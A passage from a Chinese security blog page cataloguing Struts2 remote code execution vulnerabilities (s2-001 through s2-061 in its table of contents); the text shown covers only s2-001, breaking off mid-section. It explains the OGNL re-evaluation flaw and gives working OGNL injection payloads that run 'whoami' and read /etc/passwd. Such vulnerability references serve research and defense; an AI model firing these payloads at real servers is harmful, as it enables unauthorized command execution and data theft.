<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5"><title>Struts2 | ascotbe</title><meta name="description" content="Struts2"><meta name="author" content="ascotbe"><meta name="copyright" content="ascotbe"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin><link rel="preconnect" href="//busuanzi.ibruce.info"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="Struts2"><meta name="twitter:description" content="Struts2"><meta name="twitter:image" content="https://gitee.com/asc0t6e/Random-img/raw/master/BlogCover/102.jpg"><meta property="og:type" content="article"><meta property="og:title" content="Struts2"><meta property="og:url" content="https://www.ascotbe.com/1899/11/30/Cms/Struts2/"><meta property="og:site_name" content="ascotbe"><meta property="og:description" content="Struts2"><meta property="og:image" content="https://gitee.com/asc0t6e/Random-img/raw/master/BlogCover/102.jpg"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>const autoChangeMode = '2'
var t = Cookies.get("theme");
if (autoChangeMode == '1'){
const isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
const isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
const isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

if (t === undefined){
  if (isLightMode) activateLightMode()
  else if (isDarkMode) activateDarkMode()
  else if (isNotSpecified || hasNoSupport){
    console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
    now = new Date();
    hour = now.getHours();
    isNight = hour < 6 || hour >= 18
    isNight ? activateDarkMode() : activateLightMode()
}
} else if (t == 'light') activateLightMode()
else activateDarkMode()


} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="https://www.ascotbe.com/1899/11/30/Cms/Struts2/"><link rel="prev" title="Solr" href="https://www.ascotbe.com/1899/11/30/Cms/Solr/"><link rel="next" title="Tomcat" href="https://www.ascotbe.com/1899/11/30/Cms/Tomcat/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://www.ascotbe.com/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    title: 'Snackbar.bookmark.title',
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  baiduPush: false,
  isHome: false,
  isPost: true
  
}</script><meta name="generator" content="Hexo 4.2.1"></head><body><canvas class="fireworks"></canvas><header> <div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">ascotbe</a></span><span class="toggle-menu pull_right close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/Loophole"><i class="fa-fw fa fa-link"></i><span> Loophole</span></a></div><div class="menus_item"><a class="site-page" href="/Taylor%20Swift"><i class="fa-fw fa fa-link"></i><span> Taylor Swift</span></a></div><div class="menus_item"><a class="site-page" href="/Links/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div></div></span></div></header><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">97</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/Loophole"><i class="fa-fw fa fa-link"></i><span> Loophole</span></a></div><div class="menus_item"><a class="site-page" href="/Taylor%20Swift"><i class="fa-fw fa fa-link"></i><span> Taylor Swift</span></a></div><div class="menus_item"><a class="site-page" href="/Links/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div></div></div><div id="mobile-sidebar-toc"><div class="toc_mobile_headline">目录</div><div class="sidebar-toc__content"><ol class="toc_mobile_items"><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#0x01-Struts2远程命令执行漏洞-s2-001"><span class="toc_mobile_items-number">1.</span> <span class="toc_mobile_items-text">0x01 Struts2远程命令执行漏洞(s2-001)</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#漏洞详情"><span class="toc_mobile_items-number">1.1.</span> <span class="toc_mobile_items-text">漏洞详情:</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#请求方式"><span class="toc_mobile_items-number">1.2.</span> <span class="toc_mobile_items-text">请求方式:</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#POC"><span class="toc_mobile_items-number">1.3.</span> <span class="toc_mobile_items-text">POC:</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#0x02-Struts2远程命令执行漏洞-s2-005"><span class="toc_mobile_items-number">2.</span> <span class="toc_mobile_items-text">0x02 Struts2远程命令执行漏洞(s2-005)</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#漏洞详情-1"><span class="toc_mobile_items-number">2.1.</span> <span class="toc_mobile_items-text">漏洞详情:</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#请求方式-1"><span class="toc_mobile_items-number">2.2.</span> <span class="toc_mobile_items-text">请求方式:</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#POC-1"><span class="toc_mobile_items-number">2.3.</span> <span class="toc_mobile_items-text">POC:</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#0x03-Struts2远程命令执行漏洞-s2-007"><span class="toc_mobile_items-number">3.</span> <span class="toc_mobile_items-text">0x03 Struts2远程命令执行漏洞(s2-007)</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#漏洞详情-2"><span class="toc_mobile_items-number">3.1.</span> <span class="toc_mobile_items-text">漏洞详情:</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#请求方式-2"><span class="toc_mobile_items-number">3.2.</span> <span class="toc_mobile_items-text">请求方式:</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#POC-2"><span class="toc_mobile_items-number">3.3.</span> <span class="toc_mobile_items-text">POC:</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#0x04-Struts2远程命令执行漏洞-s2-008"><span class="toc_mobile_items-number">4.</span> <span class="toc_mobile_items-text">0x04 Struts2远程命令执行漏洞(s2-008)</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#漏洞详情-3"><span class="toc_mobile_items-number">4.1.</span> <span class="toc_mobile_items-text">漏洞详情:</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#请求方式-3"><span class="toc_mobile_items-number">4.2.</span> <span class="toc_mobile_items-text">请求方式:</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#POC-3"><span class="toc_mobile_items-number">4.3.</span> <span class="toc_mobile_items-text">POC:</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#0x05-Struts2远程命令执行漏洞-s2-009"><span class="toc_mobile_items-number">5.</span> <span class="toc_mobile_items-text">0x05 Struts2远程命令执行漏洞(s2-009)</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#漏洞详情-4"><span class="toc_mobile_items-number">5.1.</span> <span class="toc_mobile_items-text">漏洞详情:</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#请求方式-4"><span class="toc_mobile_items-number">5.2.</span> <span class="toc_mobile_items-text">请求方式:</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#POC-4"><span class="toc_mobile_items-number">5.3.</span> <span class="toc_mobile_items-text">POC:</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#0x06-Struts2远程命令执行漏洞-s2-015"><span class="toc_mobile_items-number">6.</span> <span class="toc_mobile_items-text">0x06 Struts2远程命令执行漏洞(s2-015)</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#漏洞详情-5"><span class="toc_mobile_items-number">6.1.</span> <span class="toc_mobile_items-text">漏洞详情:</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#请求方式-5"><span class="toc_mobile_items-number">6.2.</span> <span class="toc_mobile_items-text">请求方式:</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#POC-5"><span class="toc_mobile_items-number">6.3.</span> <span class="toc_mobile_items-text">POC:</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#0x07-Struts2远程命令执行漏洞-s2-016"><span class="toc_mobile_items-number">7.</span> <span class="toc_mobile_items-text">0x07 Struts2远程命令执行漏洞(s2-016)</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#漏洞详情-6"><span class="toc_mobile_items-number">7.1.</span> <span class="toc_mobile_items-text">漏洞详情:</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#请求方式-6"><span class="toc_mobile_items-number">7.2.</span> <span class="toc_mobile_items-text">请求方式:</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#POC-6"><span class="toc_mobile_items-number">7.3.</span> <span class="toc_mobile_items-text">POC:</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#0x08-Struts2远程命令执行漏洞-s2-045"><span class="toc_mobile_items-number">8.</span> <span class="toc_mobile_items-text">0x08 Struts2远程命令执行漏洞(s2-045)</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#漏洞详情-7"><span class="toc_mobile_items-number">8.1.</span> <span class="toc_mobile_items-text">漏洞详情:</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#请求方式-7"><span class="toc_mobile_items-number">8.2.</span> <span class="toc_mobile_items-text">请求方式:</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#POC-7"><span class="toc_mobile_items-number">8.3.</span> <span class="toc_mobile_items-text">POC:</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#0x09-Struts2远程命令执行漏洞-s2-052"><span class="toc_mobile_items-number">9.</span> <span class="toc_mobile_items-text">0x09 Struts2远程命令执行漏洞(s2-052)</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#漏洞详情-8"><span class="toc_mobile_items-number">9.1.</span> <span class="toc_mobile_items-text">漏洞详情:</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#请求方式-8"><span class="toc_mobile_items-number">9.2.</span> <span class="toc_mobile_items-text">请求方式:</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#POC-8"><span class="toc_mobile_items-number">9.3.</span> <span class="toc_mobile_items-text">POC:</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#0x10-Struts2远程命令执行漏洞-s2-057"><span class="toc_mobile_items-number">10.</span> <span class="toc_mobile_items-text">0x10 Struts2远程命令执行漏洞(s2-057)</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#漏洞详情-9"><span class="toc_mobile_items-number">10.1.</span> <span class="toc_mobile_items-text">漏洞详情:</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#请求方式-9"><span class="toc_mobile_items-number">10.2.</span> <span class="toc_mobile_items-text">请求方式:</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#POC-9"><span class="toc_mobile_items-number">10.3.</span> <span class="toc_mobile_items-text">POC:</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#0x11-Struts2远程命令执行漏洞-s2-061"><span class="toc_mobile_items-number">11.</span> <span class="toc_mobile_items-text">0x11 Struts2远程命令执行漏洞(s2-061)</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#漏洞详情-10"><span class="toc_mobile_items-number">11.1.</span> <span class="toc_mobile_items-text">漏洞详情:</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#请求方式-10"><span class="toc_mobile_items-number">11.2.</span> <span class="toc_mobile_items-text">请求方式:</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#POC-10"><span class="toc_mobile_items-number">11.3.</span> <span class="toc_mobile_items-text">POC:</span></a></li></ol></li></ol></div></div></div><div id="body-wrap"><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true">     </i><div class="auto_open" id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-Struts2远程命令执行漏洞-s2-001"><span class="toc-number">1.</span> <span class="toc-text">0x01 Struts2远程命令执行漏洞(s2-001)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#漏洞详情"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞详情:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#请求方式"><span class="toc-number">1.2.</span> <span class="toc-text">请求方式:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#POC"><span class="toc-number">1.3.</span> <span class="toc-text">POC:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-Struts2远程命令执行漏洞-s2-005"><span class="toc-number">2.</span> <span class="toc-text">0x02 Struts2远程命令执行漏洞(s2-005)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#漏洞详情-1"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞详情:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#请求方式-1"><span class="toc-number">2.2.</span> <span class="toc-text">请求方式:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#POC-1"><span class="toc-number">2.3.</span> <span class="toc-text">POC:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-Struts2远程命令执行漏洞-s2-007"><span class="toc-number">3.</span> <span class="toc-text">0x03 Struts2远程命令执行漏洞(s2-007)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#漏洞详情-2"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞详情:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#请求方式-2"><span class="toc-number">3.2.</span> <span class="toc-text">请求方式:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#POC-2"><span class="toc-number">3.3.</span> <span class="toc-text">POC:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-Struts2远程命令执行漏洞-s2-008"><span class="toc-number">4.</span> <span class="toc-text">0x04 Struts2远程命令执行漏洞(s2-008)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#漏洞详情-3"><span class="toc-number">4.1.</span> <span class="toc-text">漏洞详情:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#请求方式-3"><span class="toc-number">4.2.</span> <span class="toc-text">请求方式:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#POC-3"><span class="toc-number">4.3.</span> <span class="toc-text">POC:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x05-Struts2远程命令执行漏洞-s2-009"><span class="toc-number">5.</span> <span class="toc-text">0x05 Struts2远程命令执行漏洞(s2-009)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#漏洞详情-4"><span class="toc-number">5.1.</span> <span class="toc-text">漏洞详情:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#请求方式-4"><span class="toc-number">5.2.</span> <span class="toc-text">请求方式:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#POC-4"><span class="toc-number">5.3.</span> <span class="toc-text">POC:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x06-Struts2远程命令执行漏洞-s2-015"><span class="toc-number">6.</span> <span class="toc-text">0x06 Struts2远程命令执行漏洞(s2-015)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#漏洞详情-5"><span class="toc-number">6.1.</span> <span class="toc-text">漏洞详情:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#请求方式-5"><span class="toc-number">6.2.</span> <span class="toc-text">请求方式:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#POC-5"><span class="toc-number">6.3.</span> <span class="toc-text">POC:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x07-Struts2远程命令执行漏洞-s2-016"><span class="toc-number">7.</span> <span class="toc-text">0x07 Struts2远程命令执行漏洞(s2-016)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#漏洞详情-6"><span class="toc-number">7.1.</span> <span class="toc-text">漏洞详情:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#请求方式-6"><span class="toc-number">7.2.</span> <span class="toc-text">请求方式:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#POC-6"><span class="toc-number">7.3.</span> <span class="toc-text">POC:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x08-Struts2远程命令执行漏洞-s2-045"><span class="toc-number">8.</span> <span class="toc-text">0x08 Struts2远程命令执行漏洞(s2-045)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#漏洞详情-7"><span class="toc-number">8.1.</span> <span class="toc-text">漏洞详情:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#请求方式-7"><span class="toc-number">8.2.</span> <span class="toc-text">请求方式:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#POC-7"><span class="toc-number">8.3.</span> <span class="toc-text">POC:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x09-Struts2远程命令执行漏洞-s2-052"><span class="toc-number">9.</span> <span class="toc-text">0x09 Struts2远程命令执行漏洞(s2-052)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#漏洞详情-8"><span class="toc-number">9.1.</span> <span class="toc-text">漏洞详情:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#请求方式-8"><span class="toc-number">9.2.</span> <span class="toc-text">请求方式:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#POC-8"><span class="toc-number">9.3.</span> <span class="toc-text">POC:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x10-Struts2远程命令执行漏洞-s2-057"><span class="toc-number">10.</span> <span class="toc-text">0x10 Struts2远程命令执行漏洞(s2-057)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#漏洞详情-9"><span class="toc-number">10.1.</span> <span class="toc-text">漏洞详情:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#请求方式-9"><span class="toc-number">10.2.</span> <span class="toc-text">请求方式:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#POC-9"><span class="toc-number">10.3.</span> <span class="toc-text">POC:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x11-Struts2远程命令执行漏洞-s2-061"><span class="toc-number">11.</span> <span class="toc-text">0x11 Struts2远程命令执行漏洞(s2-061)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#漏洞详情-10"><span class="toc-number">11.1.</span> <span class="toc-text">漏洞详情:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#请求方式-10"><span class="toc-number">11.2.</span> <span class="toc-text">请求方式:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#POC-10"><span class="toc-number">11.3.</span> <span class="toc-text">POC:</span></a></li></ol></li></ol></div></div></div><main id="content-outer"><div id="top-container" style="background-image: url(https://gitee.com/asc0t6e/Random-img/raw/master/Blog/102.jpg)"><div id="post-info"><div id="post-title"><div class="posttitle">Struts2</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 发表于 1899-11-30<span class="post-meta__separator">|</span><i class="fa fa-history fa-fw" aria-hidden="true"></i> 更新于 2020-12-29</time><div class="post-meta-wordcount"><div class="post-meta-pv-cv"><span><i class="fa fa-eye post-meta__icon fa-fw" aria-hidden="true"> </i>阅读量:</span><span id="busuanzi_value_page_pv"></span></div></div></div></div></div><div class="layout layout_post" id="content-inner">   <article id="post"><div class="article-container" id="post-content"><blockquote>
<p>声明</p>
</blockquote>
<p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p>
<h4 id="0x01-Struts2远程命令执行漏洞-s2-001"><a href="#0x01-Struts2远程命令执行漏洞-s2-001" class="headerlink" title="0x01 Struts2远程命令执行漏洞(s2-001)"></a>0x01 Struts2远程命令执行漏洞(s2-001)</h4><h5 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情:"></a>漏洞详情:</h5><ul>
<li><p>披露时间</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2010-3-11</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>CVE</code>编号</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>影响版本</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Struts2.0.0</span><br><span class="line">Struts2.0.8</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>漏洞说明</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该漏洞其实是因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用OGNL表达式%&#123;value&#125;进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用%&#123;value&#125;对提交的数据执行了一次OGNL表达式解析，所以可以直接构造Payload进行命令执行</span><br></pre></td></tr></table></figure></div>

</li>
</ul>
<h5 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式:"></a>请求方式:</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br></pre></td></tr></table></figure></div>

<h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul>
<li><p>命令执行单挑命令</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b&#x3D;#a.getInputStream(),#c&#x3D;new java.io.InputStreamReader(#b),#d&#x3D;new java.io.BufferedReader(#c),#e&#x3D;new char[50000],#d.read(#e),#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>执行带有空格的命令</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;&#x2F;etc&#x2F;passwd&quot;&#125;)).redirectErrorStream(true).start(),#b&#x3D;#a.getInputStream(),#c&#x3D;new java.io.InputStreamReader(#b),#d&#x3D;new java.io.BufferedReader(#c),#e&#x3D;new char[50000],#d.read(#e),#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure></div>

<p><a href="https://github.com/Ascotbe/Random-img/blob/master/CMS/Struts2/1.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="image-20200614214228602" class="fancybox"><img alt="image-20200614214228602" title="image-20200614214228602" data-src="https://github.com/Ascotbe/Random-img/blob/master/CMS/Struts2/1.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
</li>
<li><p>获取tomcat路径</p>
